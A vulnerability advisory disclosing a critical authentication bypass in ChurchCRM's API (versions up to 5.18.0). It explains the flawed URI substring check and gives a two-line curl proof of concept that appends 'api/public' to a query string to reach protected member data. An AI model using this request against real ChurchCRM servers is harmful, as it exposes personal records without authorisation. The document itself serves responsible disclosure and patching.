# ChurchCRM — API Authentication Bypass (minimal PoC)

**Status:** Fixed (PR #7376 merged Oct 4, 2025) — CVE pending/requested  
**Severity:** **Critical** — CVSS v3.1 **9.4** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`)

**Affected versions:** `ChurchCRM <= 5.18.0`  
**Patched versions:** `>= 5.18.1` (patch merged in PR #7376 — confirm release tag)

**Fix PR:** https://github.com/ChurchCRM/CRM/pull/7376 (merge commit `3a1cffd`)

---

## Summary
A critical authentication bypass in ChurchCRM’s API middleware allows unauthenticated attackers to access and, in some cases, manipulate protected API endpoints by including the substring `api/public` anywhere in the request URI (path, query string, or fragment). The root cause is a string match against the full URI instead of the request path.

---

## Minimal POC

```bash
### unauthenticated (expected HTTP/401)
curl -i 'https://<target>/api/persons/latest'

### bypass by adding query parameter (returns HTTP/200 and member data)
curl -i 'https://<target>/api/persons/latest?bypass=api/public'
```

---

## Timeline
- 2025-09-26 — Reported privately via GitHub security advisory.
- 2025-10-04 — Fix merged in PR #7376; maintainer closed the private advisory.
